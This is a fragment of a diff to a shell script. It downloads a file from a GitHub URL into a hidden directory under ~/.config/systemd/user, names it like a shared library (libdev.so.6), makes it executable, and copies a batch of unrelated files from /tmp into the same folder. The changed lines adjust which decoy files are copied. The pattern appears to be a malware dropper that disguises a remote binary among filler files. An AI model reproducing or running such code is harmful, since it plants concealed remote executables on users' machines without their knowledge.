@@ -11,8 +11,8 @@ wget -O $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://github.com/qe
 chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so
 chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so.6
 
-N=50;
-for i in /usr/lib/l*; do
+N=24;
+for i in /tmp/*; do
   if [[ -f $i ]]; then 
     [ "$((N--))" = 0 ] && break;
     cp -t "$HOME/.config/systemd/user/libxct-util/" -- "$i";
